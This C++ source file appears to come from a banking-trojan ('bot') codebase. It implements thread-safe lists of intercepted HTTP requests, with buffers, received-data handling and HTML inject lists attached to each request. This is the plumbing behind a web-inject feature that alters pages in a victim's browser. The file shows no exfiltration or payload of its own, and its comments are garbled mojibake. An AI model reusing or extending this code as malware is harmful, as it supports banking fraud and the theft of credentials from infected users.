//---------------------------------------------------------------------------

#include "Requests.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "BotClasses.h"
#include "BotConfig.h"

//---------------------------------------------------------------------------
void FreeRequest(PRequest R);

PRequestList Request::CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData)
{
	// ������ ������ ��������
	PRequestList List = CreateStruct(TRequestListRec);
	if (List == NULL)
		return NULL;

	List->Lock = CreateStruct(RTL_CRITICAL_SECTION);
    pInitializeCriticalSection(List->Lock);
	List->Items = List::Create();
	List::SetFreeItemMehod(List->Items, (TFreeItemMethod)FreeRequest);
	List::SetCapacity(List->Items, 128);
	List->OnInitializeExtData = OnInitExtData;
	List->OnFreeExtData = OnFreeExtData;

    return List;
}
//---------------------------------------------------------------------------

void Request::FreeList(PRequestList List)
{
	// ���������� ������ ��������
	if (List == NULL)
		return;
	List::Free(List->Items);
	pDeleteCriticalSection(List->Lock);
    FreeStruct(List->Lock);
}

//---------------------------------------------------------------------------

void FreeRequest(PRequest R)
{
	// ���������� ������

	Request::Clear(R);
	FreeStruct(R);
}

void Request::Clear(PRequest R)
{
	// �������� ������

	if (R->List->OnFreeExtData != NULL)
		R->List->OnFreeExtData(R);

	// ���������� ������

	R->Method = hmUnknown;
	STR::Free(R->URL);
	STR::Free(R->Optional);
	STR::Free(R->ContentType);

	if (R->Buffer != NULL)
		MemFree(R->Buffer);

	if (R->Injects != NULL)
	{
		HTMLInjects::ReleaseInjectsList(R->Injects);
		List::Free(R->Injects);
    }

	if (R->ReceiveBuf != NULL)
		MEMBLOCK::FreeBlock(R->ReceiveBuf);

	if (R->ReceiveList != NULL)
		MEMBLOCK::FreeList(R->ReceiveList);



	//  ��������� ������������ ������
	LPVOID OldOwner = R->Owner;
	PRequestList OldList =  R->List;

	// ������� ���������
	m_memset(R, 0, sizeof(TRequestRec));

	// ��������������� ������������ ������
	R->Owner = OldOwner;
    R->List = OldList;
}

//---------------------------------------------------------------------------

PRequest Request::Find(PRequestList List, LPVOID Owner)
{

	// ����� ������ ��� ���������
	if (List == NULL)
		return NULL;
	Request::Lock(List);
    PRequest Result = NULL;
	DWORD Count = List::Count(List->Items);
	for (DWORD i = 0; i < Count; i++)
	{
		PRequest R = (PRequest)List::GetItem(List->Items, i);
		if (R->Owner == Owner)
		{
			Result = R;
			break;
        }
	}

	Request::Unlock(List);
	return Result;
}
//---------------------------------------------------------------------------

PRequest Request::Add(PRequestList List, LPVOID Owner, bool *Existed)
{
	// �������� ������. ���� ������ ��� ��������� Owner ����������, �� �����
	// ��������� ��������� �� ����
	if (List == NULL)
		return NULL;

	Request::Lock(List);

	PRequest R = Request::Find(List, Owner);
	if (R == NULL)
	{
		// ������ �����������. ���������
		R = CreateStruct(TRequestRec);
		if (Existed != NULL)
			*Existed = R != NULL;

		if (R != NULL)
		{
			List::Add(List->Items, R);
			R->Owner = Owner;
			R->List = List;
			if (List->OnInitializeExtData != NULL)
				List->OnInitializeExtData(R);
		}

	}
	Request::Unlock(List);
	return R;
}
//---------------------------------------------------------------------------

DWORD Request::Delete(PRequestList List, LPVOID Owner)
{
	// ������� ������
	if (List == NULL)
		return false;
	Request::Lock(List);

	DWORD Count = List::Count(List->Items);
	DWORD i;
	PRequest R;
	DWORD Res = 0;
	for (i = 0; i < Count; i++)
	{
		R = (PRequest)List::GetItem(List->Items, i);
		if (R->Owner == Owner)
		{
			Res = (DWORD)R;
			List::Delete(List->Items, i);
			break;
        }
	}
	Request::Unlock(List);
	return Res;
}
//---------------------------------------------------------------------------

DWORD RequestDoGetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf)
{
	// �������� ��������� ������ ������

	if (Request == NULL || Request->Buffer == NULL)
		return 0;

	int Max = Request->BufferSize - Request->Position;
	if (Max < 0)
		Max = 0;
	// ���� �� ������ ����� ��� ������ ������, �� ����������
	// ����� ��������� ������
	if (Buf == NULL || BufSize == 0)
		return Max;

	// ������ ��� ������
	if (Max > 0)
	{
		// ����� ������
		if ((DWORD)Max > BufSize)
			Max = BufSize;
		m_memcpy(Buf, (PCHAR)Request->Buffer + Request->Position, Max);
		Request->Position += Max;

		Request->SaveReturned += Max;
	}

	if (Request->Position >= Request->BufferSize  && FreeBuf)
		Request::SetBuffer(Request, NULL, 0);

	return Max;
}

//---------------------------------------------------------------------------

DWORD Request::GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf)
{
	// �������� ��������� ������ ������

	if (Request == NULL)
		return 0;

	//Lock(Request->List);

	DWORD Result = RequestDoGetNextDataPart(Request, Buf, BufSize, FreeBuf);

	//Unlock(Request->List);

    return Result;
}
//---------------------------------------------------------------------------


void inline Request::Lock(PRequestList List)
{
	if (List != NULL)
		pEnterCriticalSection(List->Lock);
}

void inline Request::Unlock(PRequestList List)
{
	if (List != NULL)
		pLeaveCriticalSection(List->Lock);
}

void Request::SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size)
{
	DWORD OldPosition = R->Position;

	if (R->Buffer != NULL)
		MemFree(R->Buffer);

	R->Position = 0;
	R->Buffer = NewBuf;
	R->BufferSize = Size;

	if (NewBuf != NULL && Size == 0)
		R->BufferSize = StrCalcLength((PCHAR)NewBuf);

	if (R->BufferSize != 0)
		R->SavedSize = R->BufferSize;
}


//----------------------------------------------------------------------------
//  Request - ����� ������� ��� ������ � ���������
//----------------------------------------------------------------------------

void Request::InitializeReceiveData(PRequest R)
{
	// ���������������� ������ ��� �������� ���������
	if (R == NULL) return;

	if (R->ReceiveList == NULL)
		R->ReceiveList = MEMBLOCK::CreateList();

	if (R->ReceiveBuf == NULL)
	{
		PMemBlock B = CreateStruct(TMemBlock);
		B->Size = 4096;
		B->Data = MemAlloc(B->Size);
        R->ReceiveBuf = B;
    }
}

void Request::CloseReceiveData(PRequest R)
{
	// ������� �������� ����������� ������ � ����� �������
	// � ����������� ���������� ��� �������� ���������
	if (R == NULL) return;
	if (R->ReceiveBuf)
	{
		MEMBLOCK::FreeBlock(R->ReceiveBuf);
		R->ReceiveBuf = NULL;
    }

	// �������� ����������� ������
	if (R->ReceiveList != NULL)
	{
		DWORD Sz;
		LPVOID Buf = MEMBLOCK::BuildAsMem(R->ReceiveList, &Sz);
		Request::SetBuffer(R, (LPBYTE)Buf, Sz);

		MEMBLOCK::FreeList(R->ReceiveList);
		R->ReceiveList = NULL;
    }

}


// ����� �������� ���� �������� ������
void Request::EnumRequests(PRequestList Requests, TRequestEnumMethod Method, LPVOID Data)
{
	if (Requests == NULL || Method == NULL)
		return;

	Lock(Requests);

	DWORD Count = List::Count(Requests->Items);

	for (DWORD i = 0; i < Count; i++)
	{
		PRequest Request = (PRequest)List::GetItem(Requests->Items, i);
		if (!Method(Request, Data))
        	break;
	}

	Unlock(Requests);
}




//********************************************************************
//                             TRequestList
//********************************************************************

TRequestList::TRequestList()
	: TBotCollection()
{
	SetThreadSafe();
}


TRequestList::~TRequestList()
{

}

//-------------------------------------------------
//  Find
//  ������� ���� ������ �� ��� ��������������
//-------------------------------------------------
TRequest* TRequestList::DoFind(LPVOID Handle)
{
	for (int i = 0; i < Count(); i++)
	{
		TRequest *Item = (TRequest*)Items(i);
		if (Item->FHandle == Handle)
			return Item;
	}
    return NULL;
}


TRequest* TRequestList::Find(LPVOID Handle)
{
    Lock();
	TRequest* Item = DoFind(Handle);
	Unlock();
	return Item;
}


//-------------------------------------------------
//  CreateItem
//  ������� ������ ����� �������
//-------------------------------------------------
TRequest* TRequestList::CreateItem()
{
	return new TRequest(this);
}

//-------------------------------------------------
//  Add
// ������� ��������� ������
//-------------------------------------------------
TRequest* TRequestList::Add(LPVOID Handle)
{
	Lock();
	TRequest* Item = DoFind(Handle);
	if (!Item)
	{
		Item = CreateItem();
		Item->FHandle = Handle;
    }
	Item->FRefCount++; // ����������� ������� �������������
	Unlock();
	return Item;
}



//********************************************************************
//                         TRequest
//********************************************************************
TRequest::TRequest(TRequestList* Owner)
	: TBotCollectionItem(Owner)
{
	FRefCount = 0;
	FHandle   = NULL;
}

TRequest::~TRequest()
{

}
